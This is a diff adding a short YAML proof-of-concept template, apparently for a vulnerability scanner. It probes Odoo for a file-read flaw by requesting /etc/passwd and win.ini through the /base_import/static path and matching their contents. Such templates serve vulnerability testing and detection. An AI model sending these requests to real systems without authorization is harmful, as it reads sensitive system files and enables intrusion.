@@ -1,0 +1,14 @@
+name: poc-yaml-odoo-file-read
+groups:
+  win:
+    - method: GET
+      path: "/base_import/static/c:/windows/win.ini"
+      expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+  linux:
+    - method: GET
+      path: "/base_import/static/etc/passwd"
+      expression: response.status == 200 && r'root:[x*]:0:0:'.bmatches(response.body)
+detail:
+  author: amos1
+  links:
+    - https://quake.360.cn/quake/#/vulDetail/QH-202006-1954/checked
